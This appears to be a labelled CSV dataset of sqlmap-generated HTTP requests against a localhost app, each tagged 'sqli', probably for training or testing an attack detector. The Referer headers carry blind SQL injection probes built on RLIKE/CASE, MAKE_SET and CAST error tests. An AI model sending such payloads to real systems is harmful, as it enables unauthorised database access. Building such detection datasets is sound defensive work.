method,url,headers,body,label
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND 6250=9562%16"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) RLIKE (SELECT (CASE WHEN (7537=6166) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END))-- pVgL"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' RLIKE (SELECT (CASE WHEN (1469=5109) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END))-- hJRm"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) RLIKE (SELECT (CASE WHEN (9654=3515) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (4837=4837"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9)) RLIKE (SELECT (CASE WHEN (2309=2083) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND ((8718=8718"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9))) RLIKE (SELECT (CASE WHEN (2550=8031) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (((4545=4545"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 RLIKE (SELECT (CASE WHEN (2772=3635) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END))"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') RLIKE (SELECT (CASE WHEN (3908=5569) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND ('IaKF'='IaKF"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) RLIKE (SELECT (CASE WHEN (4283=7478) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (('hdFF'='hdFF"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9'))) RLIKE (SELECT (CASE WHEN (9286=9281) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND ((('iFvs'='iFvs"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' RLIKE (SELECT (CASE WHEN (2180=5529) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND 'HxHY'='HxHY"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') RLIKE (SELECT (CASE WHEN (5557=6590) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND ('BDjC' LIKE 'BDjC"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) RLIKE (SELECT (CASE WHEN (3311=1671) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (('DpjV' LIKE 'DpjV"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9%' RLIKE (SELECT (CASE WHEN (6304=8802) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND 'YWfT%'='YWfT"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' RLIKE (SELECT (CASE WHEN (5624=1652) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND 'MELS' LIKE 'MELS"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") RLIKE (SELECT (CASE WHEN (4077=4462) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (\""xthu\""=\""xthu"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"")) RLIKE (SELECT (CASE WHEN (6614=9355) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND ((\""ANec\""=\""ANec"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" RLIKE (SELECT (CASE WHEN (3160=4352) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND \""rvpj\""=\""rvpj"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") RLIKE (SELECT (CASE WHEN (2651=8289) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND (\""jOjU\"" LIKE \""jOjU"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" RLIKE (SELECT (CASE WHEN (6350=7239) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) AND \""GLvH\"" LIKE \""GLvH"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 RLIKE (SELECT (CASE WHEN (4009=5005) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END))-- AjNI"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 RLIKE (SELECT (CASE WHEN (7660=1659) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END))# bbMo"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' RLIKE (SELECT (CASE WHEN (7882=8891) THEN 0x687474703a2f2f6c6f63616c686f73743a383038312f617070732f6170702d6d75353565386139 ELSE 0x28 END)) OR 'fHPx'='qKpt"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND MAKE_SET(1350=1344,1344)-- UsUm"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND MAKE_SET(1988=4278,4278)-- Sjln"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND MAKE_SET(1770=6954,6954) AND (4899=4899"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9)) AND MAKE_SET(9941=6296,6296) AND ((9753=9753"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9))) AND MAKE_SET(8209=2051,2051) AND (((4429=4429"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND MAKE_SET(1849=8468,8468)"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND MAKE_SET(6641=5509,5509) AND ('tVmg'='tVmg"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND MAKE_SET(1062=1441,1441) AND (('mKCq'='mKCq"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9'))) AND MAKE_SET(4970=5275,5275) AND ((('fQUc'='fQUc"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND MAKE_SET(3527=9045,9045) AND 'ZHcv'='ZHcv"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND MAKE_SET(6621=4824,4824) AND ('dnOh' LIKE 'dnOh"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND MAKE_SET(4890=9771,9771) AND (('unKp' LIKE 'unKp"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9%' AND MAKE_SET(1368=9880,9880) AND 'gEWG%'='gEWG"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND MAKE_SET(1526=9730,9730) AND 'ZfUD' LIKE 'ZfUD"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND MAKE_SET(5141=1565,1565) AND (\""AtvL\""=\""AtvL"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"")) AND MAKE_SET(1714=5750,5750) AND ((\""QjhC\""=\""QjhC"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND MAKE_SET(3912=1993,1993) AND \""rZJw\""=\""rZJw"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND MAKE_SET(7069=5591,5591) AND (\""brfT\"" LIKE \""brfT"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND MAKE_SET(9691=5137,5137) AND \""jHRv\"" LIKE \""jHRv"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND MAKE_SET(2586=2251,2251)-- VHHS"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND MAKE_SET(3119=9099,9099)# wRTx"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND MAKE_SET(9026=7067,7067) OR 'Ptqi'='fwmK"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND (SELECT (CASE WHEN (5486=7056) THEN NULL ELSE CAST((CHR(100)||CHR(77)||CHR(87)||CHR(71)) AS NUMERIC) END)) IS NULL-- lCMH"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (8420=7825) THEN NULL ELSE CAST((CHR(81)||CHR(122)||CHR(79)||CHR(108)) AS NUMERIC) END)) IS NULL-- ucOm"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND (SELECT (CASE WHEN (9693=1121) THEN NULL ELSE CAST((CHR(113)||CHR(72)||CHR(89)||CHR(68)) AS NUMERIC) END)) IS NULL AND (8287=8287"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9)) AND (SELECT (CASE WHEN (3657=8962) THEN NULL ELSE CAST((CHR(97)||CHR(76)||CHR(78)||CHR(72)) AS NUMERIC) END)) IS NULL AND ((7314=7314"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9))) AND (SELECT (CASE WHEN (5461=1838) THEN NULL ELSE CAST((CHR(114)||CHR(86)||CHR(98)||CHR(110)) AS NUMERIC) END)) IS NULL AND (((9531=9531"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (3304=2863) THEN NULL ELSE CAST((CHR(77)||CHR(80)||CHR(65)||CHR(67)) AS NUMERIC) END)) IS NULL"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND (SELECT (CASE WHEN (4623=5546) THEN NULL ELSE CAST((CHR(103)||CHR(68)||CHR(72)||CHR(76)) AS NUMERIC) END)) IS NULL AND ('yfKb'='yfKb"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
